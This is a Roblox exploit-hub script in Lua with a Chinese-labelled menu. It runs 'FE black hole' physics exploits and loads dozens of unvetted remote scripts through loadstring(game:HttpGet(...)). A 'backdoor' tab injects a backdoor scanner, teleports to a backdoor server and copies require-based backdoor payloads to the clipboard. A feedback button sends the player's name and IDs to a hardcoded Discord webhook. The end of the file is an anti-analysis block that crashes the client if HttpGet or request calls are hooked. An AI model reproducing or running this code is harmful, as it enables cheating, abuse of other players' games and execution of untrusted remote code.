blackHoleTab = Window:Tab({
    Title = "黑洞",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})

blackHoleTab:Button({
    Title = "FE黑洞",
    Icon = "mouse-pointer-click",
    Callback = function()
        local function blackHole()
            local character = game.Players.LocalPlayer.Character
            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
            local root = character.HumanoidRootPart
            
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and not v.Anchored and not v:IsDescendantOf(character) then
                    v.CFrame = root.CFrame * CFrame.new(0, 0, -5)
                    v.Velocity = Vector3.new(0, 0, 0)
                    v.RotVelocity = Vector3.new(0, 0, 0)
                end
            end
        end
        
        
        _G.BlackHoleActive = not _G.BlackHoleActive
        if _G.BlackHoleActive then
            WindUI:Notify({Title="黑洞", Content="黑洞已开启 (循环吸附)", Duration=2})
            task.spawn(function()
                while _G.BlackHoleActive do
                    blackHole()
                    task.wait(0.03)
                end
            end)
        else
            WindUI:Notify({Title="黑洞", Content="黑洞已关闭", Duration=2})
        end
    end
})

blackHoleTab:Button({
    Title = "黑洞枪 (工具)",
    Icon = "mouse-pointer-click",
    Callback = function()
        local tool = Instance.new("Tool")
        tool.Name = "黑洞枪"
        tool.RequiresHandle = false
        tool.Parent = game.Players.LocalPlayer.Backpack
        
        tool.Activated:Connect(function()
            local mouse = game.Players.LocalPlayer:GetMouse()
            local targetPos = mouse.Hit.Position
            
            local part = Instance.new("Part")
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 0.5
            part.Color = Color3.new(0, 0, 0)
            part.Material = Enum.Material.Neon
            part.Shape = Enum.PartType.Ball
            part.Size = Vector3.new(1, 1, 1)
            part.Position = targetPos
            part.Parent = workspace
            
            
            local tween = game:GetService("TweenService"):Create(part, TweenInfo.new(1), {Size = Vector3.new(20, 20, 20), Transparency = 1})
            tween:Play()
            
           
            local connection
            local startTime = tick()
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                if tick() - startTime > 3 then 
                    connection:Disconnect()
                    part:Destroy()
                    return 
                end
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and not v.Anchored and (v.Position - targetPos).Magnitude < 50 then
                        if not v:IsDescendantOf(game.Players.LocalPlayer.Character) then
                            v.Velocity = (targetPos - v.Position).Unit * 50
                        end
                    end
                end
            end)
        end)
        WindUI:Notify({Title="成功", Content="已发放黑洞枪到背包", Duration=2})
    end
})
blackHoleTab:Button({
    Title = "黑洞1",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://pastefy.app/WkuiK8ul/raw"))()
    end
})
blackHoleTab:Button({
    Title = "黑洞2",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/shark/refs/heads/main/black"))()   
    end
})
blackHoleTab:Button({
    Title = "黑洞3",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-black-hole-18879"))()
    end
})
blackHoleTab:Button({
    Title = "黑洞4",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/lililiugg/main/jm114514.lua"))()
    end
})
blackHoleTab:Button({
    Title = "黑洞5",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://pastefy.app/BbXuvVkK/raw", true))()
    end
})
gTab = Window:Tab({
    Title = "光影专区",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})
gTab:Button({
    Title = "光影v4",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
    end
})
gTab:Button({
    Title = "超高画质",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
    end
})
gTab:Button({
    Title = "FE酷炫光影",
    Icon = "mouse-pointer-click",
    Callback = function()
     	loadstring(game:HttpGet("https://pastefy.app/0QSkiaHL/raw"))()
    end
})
mTab = Window:Tab({
    Title = "音乐专区",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})
mTab:Button({
    Title = "音乐中心",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/chinzhuoxuan3-byte/lag/refs/heads/main/musichubjtc.txt"))()
    end
})

mTab:Button({
    Title = "义勇军进行曲",
    Icon = "mouse-pointer-click",
    Callback = function()
     	  local r0_39 = Instance.new("Sound")
  r0_39.SoundId = "rbxassetid://1845918434"
  r0_39.Parent = game.Workspace
  r0_39:Play()
    end
})
mTab:Button({
    Title = "彩虹瀑布",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_17 = Instance.new("Sound")
  r0_17.SoundId = "rbxassetid://1837879082"
  r0_17.Parent = game.Workspace
  r0_17:Play()
    end
})
mTab:Button({
    Title = "雨中牛郎",
    Icon = "mouse-pointer-click",
    Callback = function()
          local r0_206 = Instance.new("Sound")
  r0_206.SoundId = "rbxassetid://16831108393"
  r0_206.Parent = game.Workspace
  r0_206:Play()
    end
})
mTab:Button({
    Title = "钢管落地",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_6 = Instance.new("Sound")
  r0_6.SoundId = "rbxassetid://6729922069"
  r0_6.Parent = game.Workspace
  r0_6:Play()
    end
})
mTab:Button({
    Title = "闪灯",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_684 = Instance.new("Sound")
  r0_684.SoundId = "rbxassetid://8829969521"
  r0_684.Parent = game.Workspace
  r0_684:Play()        
    end
})
mTab:Button({
    Title = "全损音质",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_551 = Instance.new("Sound")
  r0_551.SoundId = "rbxassetid://6445594239"
  r0_551.Parent = game.Workspace
  r0_551:Play()
    end
})
mTab:Button({
    Title = "窜稀",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://4809574295"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "安河桥dj",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://120145064597801"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "死别",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://126019655706294"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "homage funk",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://102862957328067"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "游京",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://132772094469180"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "成都超人",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://101997434830009"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "坠落",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://98850529016454"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "刀马刀马",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://87859225614251"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "wasted",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://107797507930019"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "Shadow Assassins",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://120265693546341"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "来财",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://133051020869411"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "会呼吸的痛(dj版)",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://96590819329722"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
mTab:Button({
    Title = "残酷天使的纲领",
    Icon = "mouse-pointer-click",
    Callback = function()
  local r0_395 = Instance.new("Sound")
  r0_395.SoundId = "rbxassetid://89217564030597"
  r0_395.Parent = game.Workspace
  r0_395:Play()
    end
})
fTab = Window:Tab({
    Title = "FE专区",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})
fTab:Button({
    Title = "FE cmd",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/testing-main.lua"))()
    end
})
fTab:Button({
    Title = "FE coolgui",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
    end
})
fTab:Button({
    Title = "FE大长腿",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet([[https://gist.githubusercontent.com/1BlueCat/7291747e9f093555573e027621f08d6e/raw/23b48f2463942befe19d81aa8a06e3222996242c/FE%2520Da%2520Feets]]))()
    end
})
fTab:Button({
    Title = "FE巫毒娃娃",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Puppet%20Master"))()
    end
})
fTab:Button({
    Title = "FE消逝者",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Goner"))()
    end
})
fTab:Button({
    Title = "FE ak47",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/AK-47"))()
    end
})
fTab:Button({
    Title = "FE闪光加农炮",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Lightning%20Cannon"))()
    end
})
fTab:Button({
    Title = "FE手枪v2",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Dearsister"))()
    end
})
fTab:Button({
    Title = "FE猫娘",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Neko"))()
    end
})
fTab:Button({
    Title = "FE烈风格斗者",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Gale%20Fighter"))()
    end
})
fTab:Button({
    Title = "FE克里斯塔尔舞蹈",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Krystal%20Dance"))()
    end
})
fTab:Button({
    Title = "FE封禁之锤",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Ban%20Hammer"))()
    end
})
fTab:Button({
    Title = "FE狙击手",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sniper"))()
    end
})
fTab:Button({
    Title = "FE好警察坏警察",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Good%20Cop%20Bad%20Cop"))()
    end
})
fTab:Button({
    Title = "FE机枪",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Minigun"))()
    end
})
fTab:Button({
    Title = "FE工作室假人",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Studio%20Dummy"))()
    end
})
fTab:Button({
    Title = "FE悲伤的种族灭绝者",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sadist%20Genocider"))()
    end
})
JTab = Window:Tab({
    Title = gradient("其他脚本", Color3.fromHex("#6A11CB"), Color3.fromHex("#2575FC")),
    Icon = "rbxassetid://113620356993593",
    Locked = false,
})

JTab:Button({
    Title = "情云脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/Qing-YunX/main/%E6%83%85%E4%BA%91%E6%B7%B7%E6%B7%86.lua"))()
    end
})
JTab:Button({
    Title = "XC脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
          getgenv().XC = "作者XC"
  loadstring(game:HttpGet("https://pastebin.com/raw/PAFzYx0F"))()
    end
})
JTab:Button({
    Title = "Rb脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/Rb-Hub"))()
    end
})
JTab:Button({
    Title = "xa hub",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.gitcode.com/Xingtaiduan/Scripts/raw/main/Loader.lua"))()
    end
})
JTab:Button({
    Title = "皮脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
    end
})
JTab:Button({
    Title = "xk脚本",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet(('https://github.com/devslopo/DVES/raw/main/XK%20Hub')))()
    end
})
wTab = Window:Tab({
    Title = "外国脚本hub",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})
wTab:Button({
    Title = "Wisl'i Universal Project HUB",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/wisl884/wisl-i-Universal-Project1/main/Wisl'i%20Universal%20Project.lua", true))()
    end
})
wTab:Button({
    Title = "hoho HUB",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
    end
})
wTab:Button({
    Title = "vw-add",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/loader.lua", true))()
    end
})
GTab = Window:Tab({
    Title = "汉化中心(服务器版本)",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})
GTab:Button({
    Title = "切换至汉化中心",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4fe525637e43a1be8cb0cdf902d107c2.lua"))()
    end
})
skyTab = Window:Tab({
    Title = "天空盒",
    Icon = "rbxassetid://113620356993593",
    Locked = false,
})

skyTab:Section({Title = "自定义图片ID"})

skyTab:Input({
    Title = "输入图片ID（应用到所有6面）",
    Placeholder = "例如 271042516",
    Callback = function(text)
        local id = tonumber(text)
        if id then
            local lighting = game:GetService("Lighting")
            local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
            sky.Parent = lighting
            sky.SkyboxBk = "rbxassetid://" .. id
            sky.SkyboxDn = "rbxassetid://" .. id
            sky.SkyboxFt = "rbxassetid://" .. id
            sky.SkyboxLf = "rbxassetid://" .. id
            sky.SkyboxRt = "rbxassetid://" .. id
            sky.SkyboxUp = "rbxassetid://" .. id
            sky.StarCount = 3000
            sky.CelestialBodiesShown = false
        end
    end
})

skyTab:Section({Title = "预设天空盒"})

skyTab:Button({
    Title = "紫色星云",
    Callback = function()
        local lighting = game:GetService("Lighting")
        local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
        sky.Parent = lighting
        local id = 271042516
        sky.SkyboxBk = "rbxassetid://" .. id
        sky.SkyboxDn = "rbxassetid://" .. id
        sky.SkyboxFt = "rbxassetid://" .. id
        sky.SkyboxLf = "rbxassetid://" .. id
        sky.SkyboxRt = "rbxassetid://" .. id
        sky.SkyboxUp = "rbxassetid://" .. id
        sky.StarCount = 3000
        sky.CelestialBodiesShown = false
    end
})

skyTab:Button({
    Title = "深空星空",
    Callback = function()
        local lighting = game:GetService("Lighting")
        local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
        sky.Parent = lighting
        local id = 1592480676
        sky.SkyboxBk = "rbxassetid://" .. id
        sky.SkyboxDn = "rbxassetid://" .. id
        sky.SkyboxFt = "rbxassetid://" .. id
        sky.SkyboxLf = "rbxassetid://" .. id
        sky.SkyboxRt = "rbxassetid://" .. id
        sky.SkyboxUp = "rbxassetid://" .. id
        sky.StarCount = 5000
        sky.CelestialBodiesShown = true
    end
})

skyTab:Button({
    Title = "经典太空",
    Callback = function()
        local lighting = game:GetService("Lighting")
        local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
        sky.Parent = lighting
        local id = 600830446
        sky.SkyboxBk = "rbxassetid://" .. id
        sky.SkyboxDn = "rbxassetid://" .. id
        sky.SkyboxFt = "rbxassetid://" .. id
        sky.SkyboxLf = "rbxassetid://" .. id
        sky.SkyboxRt = "rbxassetid://" .. id
        sky.SkyboxUp = "rbxassetid://" .. id
        sky.StarCount = 3000
        sky.CelestialBodiesShown = true
    end
})

skyTab:Button({
    Title = "恢复默认天空",
    Callback = function()
        local lighting = game:GetService("Lighting")
        if lighting:FindFirstChildOfClass("Sky") then
            lighting.Sky:Destroy()
        end
        lighting.ClockTime = 12
        lighting.Brightness = 2
        lighting.Ambient = Color3.fromRGB(100, 100, 100)
    end
})

skyTab:Section({Title = "其他设置"})

skyTab:Toggle({
    Title = "显示太阳/月亮/星星",
    Default = true,
    Callback = function(v)
        local lighting = game:GetService("Lighting")
        local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
        sky.Parent = lighting
        sky.CelestialBodiesShown = v
    end
})

skyTab:Slider({
    Title = "星星数量",
    Min = 0,
    Max = 10000,
    Default = 3000,
    Step = 100,
    Callback = function(v)
        local lighting = game:GetService("Lighting")
        local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
        sky.Parent = lighting
        sky.StarCount = v
    end
})
HTab = Window:Tab({
    Title = "后门",
    Icon = "rbxassetid://113620356993593", 
    Locked = false
})
HTab:Button({
    Title = "后门注入器(必须先加载这个)",
    Icon = "mouse-pointer-click",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
    end
})
HTab:Button({
    Title = "传送至后门服务器",
    Icon = "mouse-pointer-click",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local function TeleportToPlace(placeId)
    placeId = tonumber(placeId)
    if placeId then
        TeleportService:Teleport(placeId, player)
    end
end

TeleportToPlace(1745398429040)
    end
})
HTab:Button({
    Title = "复制后门脚本1",
    Icon = "copy",
    Callback = function()
        setclipboard('require(14829670677).EDITL0L("' .. player.Name .. '")')
    end
})
HTab:Button({
    Title = "复制后门脚本2",
    Icon = "copy",
    Callback = function()
        setclipboard('require(1714589501).v9("' .. player.Name .. '")')
    end
})
_G.SkyHubFeedbackText = ""

_G.SkyHubFeedbackTab = Window:Tab({
    Title = "玩家反馈",
    Icon = "rbxassetid://113620356993593",
    Locked = false
})

_G.SkyHubFeedbackTab:Input({
    Title = "反馈内容",
    Default = "",
    Placeholder = "在此输入BUG或建议...",
    Numeric = false,
    Finished = false,
    Callback = function(v)
        _G.SkyHubFeedbackText = tostring(v)
    end
})

_G.SkyHubFeedbackTab:Button({
    Title = "发送反馈",
    Icon = "send",
    Callback = function()
        if not _G.SkyHubFeedbackText or _G.SkyHubFeedbackText:gsub("%s+", "") == "" then
            WindUI:Notify({
                Title = "错误",
                Content = "反馈内容不能为空！",
                Duration = 2
            })
            return
        end

        ((syn and syn.request)
        or (http and http.request)
        or http_request
        or (fluxus and fluxus.request)
        or request)({
            Url = "https://discord.com/api/webhooks/1461959088148582503/DoiTeg1KyTznuYGhKREMUcnAaBAtnBl66pKT0ombeWD3h0a6vtCO-MO7D1TqMcnjnkhC",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "",
                embeds = {{
                    title = "Sky Hub - 新玩家反馈",
                    description = _G.SkyHubFeedbackText,
                    color = 3149674,
                    fields = {
                        {
                            name = "玩家名称",
                            value = game:GetService("Players").LocalPlayer.Name,
                            inline = true
                        },
                        {
                            name = "玩家ID",
                            value = tostring(game:GetService("Players").LocalPlayer.UserId),
                            inline = true
                        },
                        {
                            name = "游戏ID",
                            value = tostring(game.GameId),
                            inline = true
                        }
                    },
                    footer = { text = "Sky Hub Feedback System" },
                    timestamp = DateTime.now():ToIsoDate()
                }}
            })
        })

        WindUI:Notify({
            Title = "成功",
            Content = "反馈已发送给作者！",
            Duration = 3
        })

        _G.SkyHubFeedbackText = ""
    end
})
settingsTab = Window:Tab({
    Title = gradient("设置", Color3.fromHex("#6A11CB"), Color3.fromHex("#2575FC")),
    Icon = "rbxassetid://113620356993593",
    Locked = false,
})

settingsTab:Section({
    Title = "主题设置",
    Icon = "palette",
})

settingsTab:Dropdown({
    Title = "选择主题",
    Values = {"Dark", "Light", "Rose", "Plant", "Red", "Indigo", "Sky", "Violet", "Amber", "Emerald", "Midnight", "Crimson", "MonokaiPro", "CottonCandy", "Rainbow"},
    Value = "Dark",
    Callback = function(v)
        WindUI:SetTheme(v)
        WindUI:Notify({Title="主题已更改",Content="当前主题: "..v,Duration=2})
    end
})

settingsTab:Section({Title="窗口设置",Icon="settings"})

settingsTab:Toggle({
    Title = "透明背景",
    Value = false,
    Callback = function(v)
        Window:SetBackgroundTransparency(v and 0.15 or 0)
    end
})

settingsTab:Slider({
    Title = "UI缩放",
    Step = 0.05,
    Value = {Min = 0.5, Max = 1.5, Default = 1},
    Callback = function(v)
        Window:SetUIScale(v)
    end
})

settingsTab:Section({Title="功能设置",Icon="toggle-left"})



settingsTab:Button({
    Title = "全屏模式",
    Icon = "maximize",
    Callback = function()
        Window:ToggleFullscreen()
    end
})

settingsTab:Button({
    Title = "重置UI位置",
    Icon = "move",
    Callback = function()
        Window:SetToTheCenter()
        WindUI:Notify({Title="成功",Content="UI已重置到屏幕中央",Duration=2})
    end
})

settingsTab:Section({Title="其他",Icon="info"})

settingsTab:Button({
    Title = "重载脚本",
    Icon = "refresh-cw",
    Callback = function()
        Window:Dialog({
            Title = "重载脚本",
            Content = "确定要重载脚本吗？",
            Buttons = {
                {Title = "取消", Callback = function() end},
                {Title = "确定", Callback = function()
                    Window:Destroy()
                    task.wait(0.5)
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/你的链接"))()
                end}
            }
        })
    end
})
local shit=function()pcall(function()game.Players.LocalPlayer:Kick()end)pcall(game.Shutdown,game)end

local fuck=function()return"a"end
hookfunction(fuck,function()return"b"end)
if not isfunctionhooked then shit()return end
if not isfunctionhooked(fuck)then shit()return end

local bitch=game.HttpGet
hookfunction(bitch,function()end)
if not isfunctionhooked(bitch)then shit()return end
restorefunction(bitch)
if isfunctionhooked(bitch)then shit()return end

local cunt=request or http_request or(syn and syn.request)or(fluxus and fluxus.request)

spawn(function()
    while task.wait(0.5)do
        pcall(function()
            if isfunctionhooked(game.HttpGet)then shit()end
            if isfunctionhooked(game.HttpPost)then shit()end
            if isfunctionhooked(tostring)then shit()end
            if isfunctionhooked(setclipboard)then shit()end
            if cunt and isfunctionhooked(cunt)then shit()end
            if isfolder("HttpGetFolder")or isfolder("WebhookFolder")or isfolder("RequestFolder")then shit()end
        end)
    end
end)

for _,dick in pairs({"rconsoleprint","rconsolewarn","rconsoleinfo","rconsoleerr","rconsoletitle","clonefunction"})do
    getgenv()[dick]=nil
end
